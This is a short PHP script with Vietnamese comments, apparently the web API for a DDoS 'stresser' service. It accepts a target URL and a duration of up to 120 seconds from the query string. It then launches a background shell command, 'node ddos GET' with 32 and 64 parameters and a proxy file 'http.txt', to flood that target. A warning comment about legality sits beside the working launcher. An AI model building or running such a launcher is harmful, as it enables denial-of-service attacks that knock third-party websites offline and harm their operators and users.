<?php
header('Content-Type: application/json');

// Lấy tham số từ query string
$url = isset($_GET['url']) ? filter_var($_GET['url'], FILTER_SANITIZE_URL) : null;
$time = isset($_GET['time']) ? (int)$_GET['time'] : null;

// Kiểm tra tham số hợp lệ
if (!$url || !filter_var($url, FILTER_VALIDATE_URL)) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid or missing URL']);
    exit;
}

if ($time === null || $time <= 0 || $time > 120) {
    http_response_code(400);
    echo json_encode(['error' => 'Time must be between 1 and 120 seconds']);
    exit;
}

// Chuẩn bị dữ liệu trả về
$response = [
    'url' => $url,
    'time' => $time
];

// Trả về JSON
echo json_encode($response, JSON_PRETTY_PRINT);

// Thực thi lệnh node (CẢNH BÁO: Hãy đảm bảo lệnh này hợp pháp và an toàn)
$command = escapeshellcmd("node ddos GET " . escapeshellarg($url) . " " . escapeshellarg($time) . " 32 64 http.txt");
exec($command . " > /dev/null 2>&1 &");

?>